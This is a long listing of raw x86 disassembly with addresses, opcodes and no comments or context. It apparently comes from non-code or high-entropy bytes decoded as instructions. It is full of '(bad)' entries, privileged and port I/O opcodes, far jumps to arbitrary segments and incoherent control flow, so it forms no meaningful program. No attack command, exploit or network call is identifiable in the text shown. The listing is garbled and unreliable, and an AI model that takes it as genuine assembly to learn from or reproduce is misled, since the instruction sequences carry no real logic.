  69c91c:	xchg   esp,eax
  69c91d:	add    BYTE PTR [edi+ebx*2+0x19],cl
  69c921:	loope  0x69c984
  69c923:	adc    ebx,esp
  69c925:	loopne 0x69c8c1
  69c927:	sbb    DWORD PTR [esi-0x9168e79],0xe494d10d
  69c931:	mov    eax,ds:0x6556d539
  69c936:	dec    ebp
  69c937:	int    0x55
  69c939:	icebp  
  69c93a:	add    eax,0x11dc6849
  69c93f:	push   edi
  69c940:	xchg   edx,eax
  69c941:	pop    ecx
  69c942:	and    BYTE PTR [ebx+eax*4-0x1822947f],bl
  69c949:	pop    ss
  69c94a:	xor    al,0xe3
  69c94c:	sbb    ebx,ecx
  69c94e:	bnd jp 0x69c8ee
  69c951:	aam    0x53
  69c953:	mov    ecx,0xbc246973
  69c958:	xchg   ebx,eax
  69c959:	retf   
  69c95a:	lods   al,BYTE PTR ds:[esi]
  69c95b:	jl     0x69c939
  69c95d:	dec    ecx
  69c95e:	mov    edx,0x6d1c4d2b
  69c963:	mov    al,0xa7
  69c965:	arpl   ax,sp
  69c967:	or     edx,DWORD PTR ds:0xdfa2f4ae
  69c96d:	xor    edi,DWORD PTR [eax-0x6]
  69c970:	mov    es,eax
  69c972:	cdq    
  69c973:	scas   eax,DWORD PTR es:[edi]
  69c974:	repz and al,0x4e
  69c977:	jae    0x69c958
  69c979:	mov    esi,0xb60858bc
  69c97e:	stc    
  69c97f:	js     0x69c9ca
  69c981:	lock fwait
  69c983:	mov    dh,0xbf
  69c985:	lock cmp dl,BYTE PTR [ebx-0x5f9fc260]
  69c98c:	rcl    DWORD PTR [ebp-0x2a],cl
  69c98f:	inc    esi
  69c990:	mov    edx,0xccd87584
  69c995:	mov    al,ds:0x2a4f65fe
  69c99a:	push   edx
  69c99b:	add    al,0x3c
  69c99d:	xchg   esp,eax
  69c99e:	gs in  al,dx
  69c9a0:	adc    bh,cl
  69c9a2:	dec    ecx
  69c9a3:	sub    BYTE PTR [eax+0x3e],ch
  69c9a6:	push   cs
  69c9a7:	push   esp
  69c9a8:	addr16 popa 
  69c9aa:	dec    ebx
  69c9ab:	ret    
  69c9ac:	or     eax,0x2179a9b7
  69c9b1:	mov    esp,0x8c866910
  69c9b6:	nop
  69c9b7:	mov    bl,0xb5
  69c9b9:	pop    es
  69c9ba:	aad    0xc8
  69c9bc:	ins    BYTE PTR es:[edi],dx
  69c9bd:	cli    
  69c9be:	and    eax,0xa67b30e4
  69c9c3:	xor    DWORD PTR [eax+0x5853a8a9],ebp
  69c9c9:	add    al,0x6a
  69c9cb:	sub    al,0x88
  69c9cd:	inc    ecx
  69c9ce:	xchg   edx,eax
  69c9cf:	sbb    BYTE PTR [edi],0x5e
  69c9d2:	and    ecx,DWORD PTR [esi]
  69c9d4:	xor    DWORD PTR [eax+esi*4-0x2b1e2b2a],0x4330b96e
  69c9df:	xor    ch,bl
  69c9e1:	mov    edi,DWORD PTR ds:0xbcc68ede
  69c9e7:	retf   
  69c9e8:	int    0x79
  69c9ea:	clc    
  69c9eb:	pop    es
  69c9ec:	jae    0x69ca69
  69c9ee:	aam    0xc6
  69c9f0:	mov    ebp,0x96589af4
  69c9f5:	fst    DWORD PTR [eax]
  69c9f7:	cmp    eax,ebp
  69c9f9:	dec    eax
  69c9fa:	stos   DWORD PTR es:[edi],eax
  69c9fb:	jle    0x69ca16
  69c9fd:	adc    DWORD PTR [esi-0x6fb41686],0xffffffd0
  69ca04:	lods   eax,DWORD PTR ds:[esi]
  69ca05:	aaa    
  69ca06:	test   al,0x92
  69ca08:	int    0x1b
  69ca0a:	lods   al,BYTE PTR ds:[esi]
  69ca0b:	inc    ebp
  69ca0c:	dec    edi
  69ca0d:	stc    
  69ca0e:	jo     0x69c9eb
  69ca10:	jmp    0xdd5c:0x94c172d0
  69ca17:	or     eax,0xbf0aec5d
  69ca1c:	inc    ebp
  69ca1d:	jp     0x69ca44
  69ca1f:	sub    edi,0xffffff98
  69ca22:	jnp    0x69ca86
  69ca24:	stc    
  69ca25:	imul   esp,DWORD PTR [ecx+ebp*8-0x72],0xffffffb9
  69ca2a:	mov    bh,0xc8
  69ca2c:	and    dh,BYTE PTR [edx-0x9338e2f]
  69ca32:	nop
  69ca33:	cmp    eax,0xc3862794
  69ca38:	xor    al,0x79
  69ca3a:	inc    ebx
  69ca3b:	test   eax,0x4dc27450
  69ca40:	scas   eax,DWORD PTR es:[edi]
  69ca41:	add    BYTE PTR [ebp+0x65],bl
  69ca44:	adc    eax,0x56950888
  69ca49:	adc    BYTE PTR ds:0x9c6e5d22,ch
  69ca4f:	jle    0x69ca23
  69ca51:	mov    ebx,0x9666d66e
  69ca56:	adc    ah,BYTE PTR [ecx]
  69ca58:	data16 adc dh,BYTE PTR [edx]
  69ca5b:	add    BYTE PTR [edi+0x47f4ea03],bl
  69ca61:	imul   ebp,DWORD PTR [ebx+ebx*8+0x6],0x45182330
  69ca69:	(bad)  
  69ca6b:	push   esi
  69ca6c:	jecxz  0x69ca43
  69ca6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69ca6f:	push   ds
  69ca70:	push   0x333fc916
  69ca75:	jns    0x69ca93
  69ca77:	loopne 0x69ca32
  69ca79:	ss adc cl,bh
  69ca7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69ca7d:	jmp    DWORD PTR [esi+0x34f36c81]
  69ca83:	jl     0x69ca61
  69ca85:	adc    BYTE PTR [eax+0x3323bd0e],dh
  69ca8b:	outs   dx,BYTE PTR ds:[esi]
  69ca8c:	pop    ds
  69ca8d:	mov    esi,0x925c60a4
  69ca92:	les    ecx,FWORD PTR [eax+0xd]
  69ca95:	jecxz  0x69cae9
  69ca97:	sbb    DWORD PTR [ecx+edx*4],0xc610eb16
  69ca9e:	retf   0x8a4b
  69caa1:	loopne 0x69ca45
  69caa3:	mov    ebp,0xdeb18d8d
  69caa8:	dec    ecx
  69caa9:	xchg   ebx,eax
  69caaa:	mov    eax,cs:0x9c3daca6
  69cab0:	loopne 0x69cafc
  69cab2:	out    0xb1,eax
  69cab4:	adc    al,al
  69cab6:	or     DWORD PTR [edx],0xfa695ea8
  69cabc:	rol    dh,cl
  69cabe:	pop    ebx
  69cabf:	out    dx,eax
  69cac0:	hlt    
  69cac1:	in     al,dx
  69cac2:	mov    ebx,0xfafc1370
  69cac7:	mov    ebp,0x6353c697
  69cacc:	shl    BYTE PTR [ebp+0x71b6fa0d],1
  69cad2:	inc    ebp
  69cad3:	pushf  
  69cad4:	push   esi
  69cad5:	mov    ebx,0xfb43c9c5
  69cada:	push   es
  69cadb:	ficom  DWORD PTR [edi-0x34]
  69cade:	loope  0x69cb3d
  69cae0:	sar    esp,0xeb
  69cae3:	xor    ebp,DWORD PTR [edx]
  69cae5:	xor    eax,0x6afd03c1
  69caea:	cmp    DWORD PTR [ebx],0xffffffa1
  69caed:	and    BYTE PTR [edx+0x4e4d5ab0],al
  69caf3:	pop    ecx
  69caf4:	arpl   bp,cx
  69caf6:	les    edx,FWORD PTR [edi-0x21]
  69caf9:	lods   al,BYTE PTR ds:[esi]
  69cafa:	mov    ah,0x64
  69cafc:	les    ecx,FWORD PTR [esi+0x5a4a167d]
  69cb02:	test   eax,0x19d831b3
  69cb07:	adc    BYTE PTR [esi+0x44],0x5f
  69cb0b:	add    ebp,DWORD PTR ds:[ecx+esi*8]
  69cb0f:	jnp    0x69cabb
  69cb11:	jl     0x69cb17
  69cb13:	and    al,0x6f
  69cb15:	and    edx,DWORD PTR [ebx-0x768f49b6]
  69cb1b:	jnp    0x69cb00
  69cb1d:	push   ebx
  69cb1e:	mov    eax,0xfc53ff37
  69cb23:	inc    edi
  69cb24:	mov    eax,ds:0xcc88d168
  69cb29:	xor    bl,dh
  69cb2b:	stos   BYTE PTR es:[edi],al
  69cb2c:	pop    es
  69cb2d:	sub    eax,0x442e9d40
  69cb32:	dec    ebp
  69cb33:	push   ds
  69cb34:	pop    es
  69cb35:	std    
  69cb36:	(bad)  
  69cb37:	imul   ebp,DWORD PTR [ecx-0xbe6fcdd],0x22529f34
  69cb41:	xchg   DWORD PTR [eax+0x5f598a6],ebp
  69cb47:	xchg   ebp,eax
  69cb48:	dec    esi
  69cb49:	and    al,BYTE PTR [eax-0x1]
  69cb4c:	das    
  69cb4d:	mov    esi,0x537f6882
  69cb52:	jl     0x69cb40
  69cb54:	shl    BYTE PTR [edi-0x1460f993],cl
  69cb5a:	mov    bl,0xbd
  69cb5c:	adc    eax,0xfeb4ea19
  69cb61:	xchg   edx,eax
  69cb62:	rcl    DWORD PTR [esi+0x42334400],1
  69cb68:	adc    ebx,DWORD PTR [esi-0x54713edb]
  69cb6e:	mov    edi,0xa0002409
  69cb73:	xor    cl,dl
  69cb75:	fstp   TBYTE PTR [ebp+0x7]
  69cb78:	xchg   esp,eax
  69cb79:	jmp    0xb882c0d3
  69cb7e:	fbstp  TBYTE PTR [eax*8-0x6340b8aa]
  69cb85:	xor    BYTE PTR [ebx],0x28
  69cb88:	xor    al,0xb9
  69cb8a:	rol    BYTE PTR [ebp+eax*4-0x6193dbba],0x12
  69cb92:	test   eax,0x33af94de
  69cb97:	out    dx,al
  69cb98:	fdiv   st,st(2)
  69cb9a:	sbb    bh,al
  69cb9c:	dec    edx
  69cb9d:	leave  
  69cb9e:	push   ebp
  69cb9f:	fwait
  69cba0:	call   0xac7c2aeb
  69cba5:	int    0x61
  69cba7:	xchg   edi,eax
  69cba8:	jae    0x69cc1a
  69cbaa:	mov    dl,0x34
  69cbac:	sub    dl,BYTE PTR [esi+ebx*8]
  69cbaf:	jge    0x69cc13
  69cbb1:	add    bl,BYTE PTR [edx-0x53]
  69cbb4:	mov    ebp,0x80c89d1f
  69cbb9:	xchg   edi,eax
  69cbba:	test   eax,0x4e2a0b11
  69cbbf:	xor    ecx,DWORD PTR [ebx]
  69cbc1:	pop    esp
  69cbc2:	idiv   bh
  69cbc4:	mov    BYTE PTR [ecx],0x60
  69cbc7:	pop    ss
  69cbc8:	pop    edx
  69cbc9:	mov    ah,0x6
  69cbcb:	gs aad 0xc2
  69cbce:	and    bh,BYTE PTR [esi-0x66]
  69cbd1:	jg     0x69cc1d
  69cbd3:	xor    ebx,DWORD PTR [edx+0x20820f02]
  69cbd9:	mov    edx,DWORD PTR [ebx+eiz*2]
  69cbdc:	jge    0x69cbf7
  69cbde:	stos   BYTE PTR es:[edi],al
  69cbdf:	push   ecx
  69cbe0:	test   eax,0x3578eb04
  69cbe5:	xor    BYTE PTR [edx+0x15a79381],0xa6
  69cbec:	aas    
  69cbed:	push   cs
  69cbee:	pop    ss
  69cbef:	add    eax,0x4924e589
  69cbf4:	jge    0x69cbf0
  69cbf6:	jae    0x69cc6b
  69cbf8:	xchg   esi,eax
  69cbf9:	xor    ah,0xe3
  69cbfc:	js     0x69cc4d
  69cbfe:	scas   eax,DWORD PTR es:[edi]
  69cbff:	enter  0xd165,0x23
  69cc03:	push   esi
  69cc04:	in     eax,dx
  69cc05:	xchg   ecx,eax
  69cc06:	adc    al,0xa4
  69cc08:	ds sbb al,0xbf
  69cc0b:	or     BYTE PTR [esi+ecx*1-0x747f60b4],bh
  69cc12:	mov    ch,0xd5
  69cc14:	push   ebx
  69cc15:	test   esp,0x66ca1652
  69cc1b:	mov    edi,0x3c8dc79c
  69cc20:	cs and edx,esp
  69cc23:	ins    BYTE PTR es:[edi],dx
  69cc24:	adc    edx,eax
  69cc26:	imul   edx,DWORD PTR [esi+0x366f3d1d],0x3cd45030
  69cc30:	repnz fwait
  69cc32:	xchg   edx,eax
  69cc33:	(bad)  
  69cc34:	outs   dx,DWORD PTR ds:[esi]
  69cc35:	int3   
  69cc36:	imul   esp,DWORD PTR ds:0x7c2d9a30,0x11
  69cc3d:	test   eax,0x6e6bee9a
  69cc42:	dec    ebx
  69cc43:	xor    ebp,ebx
  69cc45:	push   ebx
  69cc46:	outs   dx,DWORD PTR ds:[esi]
  69cc47:	outs   dx,BYTE PTR ds:[esi]
  69cc48:	jg     0x69ccaf
  69cc4a:	adc    al,0x58
  69cc4c:	xchg   DWORD PTR [ecx],esi
  69cc4e:	jge    0x69cca4
  69cc50:	clc    
  69cc51:	jp     0x69cbef
  69cc53:	int    0x9f
  69cc55:	push   esi
  69cc56:	fcomp  QWORD PTR [esi]
  69cc58:	jo     0x69cc66
  69cc5a:	inc    ecx
  69cc5b:	push   ebp
  69cc5c:	out    dx,eax
  69cc5d:	jae    0x69ccc9
  69cc5f:	call   0x176a81c0
  69cc64:	pop    ebx
  69cc65:	in     al,0x81
  69cc67:	mov    al,0x20
  69cc69:	outs   dx,DWORD PTR ds:[esi]
  69cc6a:	push   ebx
  69cc6b:	ins    DWORD PTR es:[edi],dx
  69cc6c:	or     eax,0x1d43dd2a
  69cc71:	add    cl,BYTE PTR [edi-0x41e0e48]
  69cc77:	ins    BYTE PTR es:[edi],dx
  69cc78:	aaa    
  69cc79:	in     al,dx
  69cc7a:	inc    edi
  69cc7b:	mov    WORD PTR [ecx+ecx*2],cs
  69cc7e:	aas    
  69cc7f:	stos   DWORD PTR es:[edi],eax
  69cc80:	cmp    BYTE PTR [eax+0x58b0184f],dl
  69cc86:	fldcw  WORD PTR [esi-0x18]
  69cc89:	jle    0x69ccab
  69cc8b:	xchg   DWORD PTR [esi-0x16645947],esi
  69cc91:	rcr    DWORD PTR [ecx-0x3fe38afd],cl
  69cc97:	fcom   DWORD PTR [eax+0x952ccd1]
  69cc9d:	imul   ebx,DWORD PTR [esi-0x6dce06fe],0x52
  69cca4:	sbb    eax,0xaded0525
  69cca9:	loop   0x69ccec
  69ccab:	retf   
  69ccac:	aad    0xd0
  69ccae:	call   0xa8f3:0x80f10d59
  69ccb5:	push   esi
  69ccb6:	adc    al,0x3d
  69ccb8:	(bad)  
  69ccb9:	mov    al,ds:0x14fd4653
  69ccbe:	xchg   edx,eax
  69ccbf:	xchg   dh,dl
  69ccc1:	jne    0x69ccd0
  69ccc3:	sbb    dh,BYTE PTR [eax]
  69ccc5:	sti    
  69ccc6:	shl    cl,0xaa
  69ccc9:	jmp    0x69cd12
  69cccb:	test   eax,0x23ec3353
  69ccd0:	xor    BYTE PTR [ebx],al
  69ccd2:	pushf  
  69ccd3:	stos   DWORD PTR es:[edi],eax
  69ccd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69ccd5:	jnp    0x69ccf6
  69ccd7:	test   al,0x3c
  69ccd9:	inc    edx
  69ccda:	dec    ebx
  69ccdb:	push   ebx
  69ccdc:	xchg   esp,eax
  69ccdd:	outs   dx,DWORD PTR ds:[esi]
  69ccde:	nop
  69ccdf:	push   ebx
  69cce0:	aam    0x43
  69cce2:	test   eax,0x348bbf61
  69cce7:	jle    0x69cd61
  69cce9:	add    BYTE PTR [ebp-0x54b7bdf],bl
  69ccef:	fcmovb st,st(5)
  69ccf1:	jg     0x69ccab
  69ccf3:	mov    edi,0xac087c61
  69ccf8:	int3   
  69ccf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69ccfa:	jl     0x69ccf3
  69ccfc:	adc    edx,edi
  69ccfe:	jmp    0x69cd39
  69cd00:	mov    esi,0x1d1ca29a
  69cd05:	ret    
  69cd06:	data16 mov bl,0xe7
  69cd0a:	(bad)  
  69cd0b:	sub    edi,DWORD PTR [ecx+0x56]
  69cd0e:	add    al,0xce
  69cd10:	push   ss
  69cd11:	daa    
  69cd12:	inc    ecx
  69cd13:	inc    eax
  69cd14:	ja     0xc502ac61
  69cd1a:	mov    dh,0xaa
  69cd1c:	arpl   WORD PTR [ebp+esi*8+0x2f],si
  69cd20:	sbb    al,0x34
  69cd22:	adc    ecx,DWORD PTR [eax-0x4c]
  69cd25:	fidiv  DWORD PTR ds:0x27034283
  69cd2b:	inc    edi
  69cd2c:	xor    eax,0x9a4e8ec2
  69cd31:	aaa    
  69cd32:	add    al,dh
  69cd34:	sahf   
  69cd35:	inc    eax
  69cd36:	lock mov esp,0xbed5f3ad
  69cd3c:	jge    0x69cd10
  69cd3e:	retf   
  69cd3f:	push   0xa
  69cd41:	stc    
  69cd42:	jmp    0xf123:0x4e66776e
  69cd49:	out    dx,eax
  69cd4a:	cdq    
  69cd4b:	sbb    DWORD PTR [edx-0x1a],esp
  69cd4e:	int3   
  69cd4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69cd50:	or     eax,0xcc0efa97
  69cd55:	repnz fs inc ecx
  69cd58:	sbb    edx,DWORD PTR [edx-0x4a]
  69cd5b:	add    BYTE PTR [eax+0x63],bl
  69cd5e:	and    edx,0xa26f9104
  69cd64:	sbb    eax,0x8df94c9
  69cd69:	and    al,0xf5
  69cd6b:	cmp    cl,BYTE PTR [ecx+0x13]
  69cd6e:	sub    ch,BYTE PTR [edx-0x42160312]
  69cd74:	xor    al,BYTE PTR [edi+0x7c4d4291]
  69cd7a:	retf   0xabfa
  69cd7d:	dec    ebx
  69cd7e:	mov    edi,0x28ab7ac
  69cd83:	dec    esi
  69cd84:	popa   
  69cd85:	inc    edx
  69cd86:	inc    ebx
  69cd87:	ret    
  69cd88:	loop   0x69cdca
  69cd8a:	mov    ebx,0xb61ee719
  69cd8f:	fmulp  st(2),st
  69cd91:	scas   eax,DWORD PTR es:[edi]
  69cd92:	jo     0x69cdd4
  69cd94:	push   ss
  69cd95:	jge    0x69cdd8
  69cd97:	loop   0x69cd93
  69cd99:	adc    DWORD PTR [ecx-0x2d],edx
  69cd9c:	inc    ebx
  69cd9d:	add    al,0x88
  69cd9f:	mov    ecx,0xc29979b0
  69cda4:	push   es
  69cda5:	repnz push esp
  69cda7:	fwait
  69cda8:	jae    0x69cd9a
  69cdaa:	loop   0x69cde7
  69cdac:	pop    ecx
  69cdad:	retf   0xf6f2
  69cdb0:	shl    ebp,0x55
  69cdb3:	adc    al,0xf1
  69cdb5:	inc    ecx
  69cdb6:	shl    bl,0xbf
  69cdb9:	pop    eax
  69cdba:	or     eax,0x4c2ab3ea
  69cdbf:	xor    DWORD PTR ds:0xd74b0ddb,edx
  69cdc5:	pop    ds
  69cdc6:	sbb    DWORD PTR [ebx+0x5f99dd76],ecx
  69cdcc:	fnstsw WORD PTR [edi-0x4a80076f]
  69cdd2:	sti    
  69cdd3:	xor    dl,cl
  69cdd5:	adc    esp,DWORD PTR [esi+0x1bdb18e3]
  69cddb:	mul    BYTE PTR [edx]
  69cddd:	into   
  69cdde:	pop    es
  69cddf:	(bad)  
  69cde0:	iret   
  69cde1:	jge    0x69ce0b
  69cde3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69cde4:	data16 mov dl,0x62
  69cde7:	xchg   DWORD PTR [ebx+0x4975a02a],ebx
  69cded:	xor    DWORD PTR [edi+0x603850cc],ebp
  69cdf3:	bound  ebp,QWORD PTR [eax]
  69cdf5:	es sub ebp,esp
  69cdf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69cdf9:	or     ecx,DWORD PTR [esi+0x4a8d13aa]
  69cdff:	hlt    
  69ce00:	cmp    al,0x14
  69ce02:	out    0x89,al
  69ce04:	adc    DWORD PTR [ecx],edx
  69ce06:	sbb    ebp,esp
  69ce08:	xor    eax,0x199853cb
  69ce0d:	addr16 ss xchg edi,eax
  69ce10:	ja     0x69ce38
  69ce12:	sbb    eax,0x96aa99c1
  69ce17:	jle    0x69ce67
  69ce19:	xor    eax,0x890964c1
  69ce1e:	mov    eax,esi
  69ce20:	lea    edi,[ebx+0x4eaf7b86]
  69ce26:	dec    ecx
  69ce27:	retf   0x56f6
  69ce2a:	inc    edi
  69ce2b:	nop
  69ce2c:	xor    DWORD PTR [edi-0x1ee0f81b],0xffffff80
  69ce33:	out    dx,eax
  69ce34:	cmp    esp,esi
  69ce36:	in     eax,dx
  69ce37:	(bad)  
  69ce39:	push   ss
  69ce3a:	or     esi,DWORD PTR [edi+esi*8+0x3858b7f7]
  69ce41:	push   edx
  69ce42:	les    ecx,FWORD PTR [ecx+0x397b958e]
  69ce48:	cs jo  0x69ce9c
  69ce4b:	push   0xffffffd9
  69ce4d:	iret   
  69ce4e:	popf   
  69ce4f:	imul   edi,DWORD PTR [ecx+esi*2-0x1ee8f0aa],0x7eaea716
  69ce5a:	adc    eax,0xa394435e
  69ce5f:	push   ebx
  69ce60:	call   0x9848:0xdc52f786
  69ce67:	inc    ecx
  69ce68:	daa    
  69ce69:	out    0x83,eax
  69ce6b:	loop   0x69ce3d
  69ce6d:	shl    DWORD PTR [eax],0x5a
  69ce70:	push   0x4a1f79db
  69ce75:	jo     0x69ceaa
  69ce77:	inc    esp
  69ce78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69ce79:	mov    ds:0x6eb0fff5,eax
  69ce7e:	enter  0xe233,0x73
  69ce82:	xchg   esp,eax
  69ce83:	imul   ebp,DWORD PTR [edi+0x55],0xffffffa6
  69ce87:	xchg   ebx,eax
  69ce88:	shr    BYTE PTR [eax],cl
  69ce8a:	sub    eax,0x4e35ed45
  69ce8f:	popa   
  69ce90:	cmp    eax,0x5c20ae15
  69ce95:	rol    DWORD PTR [eax+0x48e6a82d],0xe5
  69ce9c:	inc    ebp
  69ce9d:	mov    bh,0x7
  69ce9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69cea0:	dec    edi
  69cea1:	and    BYTE PTR [esi+0x421cbb3a],al
  69cea7:	mov    cl,0x39
  69cea9:	popa   
  69ceaa:	in     eax,dx
  69ceab:	inc    ebx
  69ceac:	push   ds
  69cead:	sub    esp,DWORD PTR [ebx+0x2c75ebc7]
  69ceb3:	rcl    BYTE PTR [ecx],0x11
  69ceb6:	in     al,0xa7
  69ceb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69ceb9:	lea    edi,[ebp-0x6d]
  69cebc:	mov    ebp,0x52bb91e6
  69cec1:	jo     0x69cefc
  69cec3:	jnp    0x69ce6f
  69cec5:	jg     0x69ce67
  69cec7:	in     al,dx
  69cec8:	sub    DWORD PTR [eax],edi
  69ceca:	repnz mov esi,0xef68642e
  69ced0:	je     0x69cef0
  69ced2:	dec    esi
  69ced3:	jge    0x69cefe
  69ced5:	jne    0x69ceee
  69ced7:	inc    ebp
  69ced8:	mov    eax,0xf0cceff2
  69cedd:	xchg   edx,eax
  69cede:	mov    ds:0x9ac62a5a,eax
  69cee3:	sub    al,0x45
  69cee5:	icebp  
  69cee6:	mov    ds:0x1c685198,al
  69ceeb:	ficom  WORD PTR [ebx+0x31]
  69ceee:	push   0xa9eee86d
  69cef3:	mov    bl,0xaa
  69cef5:	xchg   ebp,eax
  69cef6:	push   0x6f
  69cef8:	add    eax,0x118089f7
  69cefd:	adc    eax,0x21b31dac
  69cf02:	pop    ebx
  69cf03:	pop    ecx
  69cf04:	lds    esi,FWORD PTR [ebx+0x4e]
  69cf07:	popa   
  69cf08:	mov    esp,0x23dd7940
  69cf0d:	ins    DWORD PTR es:[edi],dx
  69cf0e:	add    DWORD PTR [edx+0x5b14bd3b],ebp
  69cf14:	and    BYTE PTR [ebp+0x59],ch
  69cf17:	stos   BYTE PTR es:[edi],al
  69cf18:	add    DWORD PTR [edi-0x28bfd5b3],0x73
  69cf1f:	stc    
  69cf20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69cf21:	ins    DWORD PTR es:[edi],dx
  69cf22:	dec    edx
  69cf23:	push   ds
  69cf24:	das    
  69cf25:	dec    ecx
  69cf26:	fincstp 
  69cf28:	inc    ebp
  69cf29:	jle    0x69cef0
  69cf2b:	pop    ebx
  69cf2c:	out    0x4e,al
  69cf2e:	xor    al,0xcf
  69cf30:	xlat   BYTE PTR ds:[ebx]
  69cf31:	ins    BYTE PTR es:[edi],dx
  69cf32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69cf33:	(bad)  
  69cf34:	hlt    
  69cf35:	add    ah,dl
  69cf37:	loope  0x69cf16
  69cf39:	adc    al,ah
  69cf3b:	cmp    dl,dl
  69cf3d:	ins    BYTE PTR es:[edi],dx
  69cf3e:	inc    edx
  69cf3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69cf40:	cmp    DWORD PTR [ebx-0x4a6624fe],0xf56ab197
  69cf4a:	in     al,dx
  69cf4b:	inc    ebx
  69cf4c:	xchg   ebx,eax
  69cf4d:	inc    ecx
  69cf4e:	outs   dx,BYTE PTR ds:[esi]
  69cf4f:	call   0x360e:0xe180ebf6
  69cf56:	jl     0x69cee9
  69cf58:	mov    eax,ds:0x970c5b8a
  69cf5d:	and    eax,ecx
  69cf5f:	js     0x69cfa2
  69cf61:	jp     0x69ceeb
  69cf63:	lods   al,BYTE PTR ds:[esi]
  69cf64:	loope  0x69cf9a
  69cf66:	stc    
  69cf67:	mov    al,ds:0x55647542
  69cf6c:	dec    ebp
  69cf6d:	(bad)  
  69cf6e:	dec    esp
  69cf6f:	(bad)
  69cf72:	dec    edx
  69cf73:	push   0xffffffbf
  69cf75:	add    ch,BYTE PTR [edi]
  69cf77:	int3   
  69cf78:	xchg   DWORD PTR [edi],esp
  69cf7a:	fisttp QWORD PTR [ecx-0x4ce55ea]
  69cf80:	addr16 hlt 
  69cf82:	jecxz  0x69cf26
  69cf84:	rcl    BYTE PTR [ecx],cl
  69cf86:	xchg   ebp,eax
  69cf87:	xchg   ecx,eax
  69cf88:	push   ebx
  69cf89:	and    BYTE PTR [edx],0x18
  69cf8c:	ficom  WORD PTR [edi+0x4baa8fd3]
  69cf92:	mov    ds:0x548aba1,eax
  69cf97:	(bad)
  69cf9a:	xchg   ebp,eax
  69cf9b:	aam    0xb1
  69cf9d:	fstp   TBYTE PTR [ebp+0x36a5281b]
  69cfa3:	ret    
  69cfa4:	loopne 0x69cfdd
  69cfa6:	mov    bl,0x4a
  69cfa8:	ss mov ch,0x95
  69cfab:	(bad)  
  69cfac:	sbb    DWORD PTR [ebx],ebp
  69cfae:	mov    ebp,0xcbedd19b
  69cfb3:	cld    
  69cfb4:	mov    al,ds:0x39c6a153
  69cfb9:	mov    dl,0x7b
  69cfbb:	pop    esi
  69cfbc:	sub    bl,dh
  69cfbe:	out    0x4a,al
  69cfc0:	ja     0x69d03a
  69cfc2:	adc    BYTE PTR ds:0x5e0d6b16,0x2f
  69cfc9:	loopne 0x69d029
  69cfcb:	push   cs
  69cfcc:	ret    
  69cfcd:	call   0x7e25d21e
  69cfd2:	pushf  
  69cfd3:	jne    0x69d042
  69cfd5:	cmp    BYTE PTR [ecx+0x4b5d2265],al
  69cfdb:	nop
  69cfdc:	pop    ebx
  69cfdd:	outs   dx,DWORD PTR ds:[esi]
  69cfde:	stos   BYTE PTR es:[edi],al
  69cfdf:	js     0x69cffa
  69cfe1:	stos   DWORD PTR es:[edi],eax
  69cfe2:	cmp    al,0xc5
  69cfe4:	xor    ebp,DWORD PTR [eax+0x7cf23c0b]
  69cfea:	dec    edx
  69cfeb:	and    DWORD PTR [ebp+0x17ad5f8a],esi
  69cff1:	or     eax,0x8bff7cef
  69cff6:	or     eax,0x9c76dd6e
  69cffb:	xlat   BYTE PTR ds:[ebx]
  69cffc:	jle    0x69cf87
  69cffe:	stc    
  69cfff:	or     al,0x2f
  69d001:	ficomp DWORD PTR fs:[edi+0x2572f49a]
  69d008:	daa    
  69d009:	mov    cl,0x71
  69d00b:	lea    edi,[ebp-0x58c014e5]
  69d011:	pop    ecx
  69d012:	pusha  
  69d013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69d014:	mov    ds:0x181f4af1,eax
  69d019:	mov    dl,0xa2
  69d01b:	jno    0x69d087
  69d01d:	jo     0x69d099
  69d01f:	aam    0x46
  69d021:	push   cs
  69d022:	push   es
  69d023:	sbb    DWORD PTR [edi+0x6a],0xfffffff5
  69d027:	dec    ecx
  69d028:	pusha  
  69d029:	inc    edi
  69d02a:	loop   0x69d069
  69d02c:	imul   BYTE PTR [eax+edx*2-0xf]
  69d030:	mov    al,0x59
  69d032:	adc    bh,BYTE PTR [ebp+0x4e]
  69d035:	mov    dh,0x80
  69d037:	push   0xffffffa9
  69d039:	mov    ebx,0x8f5c1e57
  69d03e:	add    eax,0xd92e7ec4
  69d043:	data16 cmc 
  69d045:	mov    ebp,0xbad3ca0b
  69d04a:	adc    eax,0x8d3d51d7
  69d04f:	ins    DWORD PTR es:[edi],dx
  69d050:	dec    edx
  69d051:	adc    DWORD PTR ds:0x1214e989,ecx
  69d057:	test   BYTE PTR [ebp+0x30],bl
  69d05a:	push   ds
  69d05b:	in     al,0xb2
  69d05d:	xchg   ebx,eax
  69d05e:	pushf  
  69d05f:	jns    0x69d041
  69d061:	cli    
  69d062:	test   al,0x20
  69d064:	int    0x20
  69d066:	xor    al,0x9f
  69d068:	outs   dx,DWORD PTR ds:[esi]
  69d069:	in     al,0xde
  69d06b:	rcr    BYTE PTR [ebx-0x49],1
  69d06e:	mov    ah,0x77
  69d070:	(bad)  
  69d071:	cmp    esi,DWORD PTR [edx+0x36234d64]
  69d077:	push   esi
  69d078:	push   esp
  69d079:	xchg   edi,eax
  69d07a:	adc    eax,0x572e858d
  69d07f:	or     al,0x87
  69d081:	ja     0x69d0d1
  69d083:	dec    edx
  69d084:	fcomp  QWORD PTR [ebp-0x72b38316]
  69d08a:	xor    BYTE PTR [esi+0x1b464696],al
  69d090:	leave  
  69d091:	mov    eax,0x91df1650
  69d096:	inc    esi
  69d097:	call   0xc3ff6729
  69d09c:	fiadd  WORD PTR [ecx-0x697cc209]
  69d0a2:	ja     0x69d09b
  69d0a4:	int3   
  69d0a5:	jns    0x69d119
  69d0a7:	jge    0x69d066
  69d0a9:	int3   
  69d0aa:	cwde   
  69d0ab:	stc    
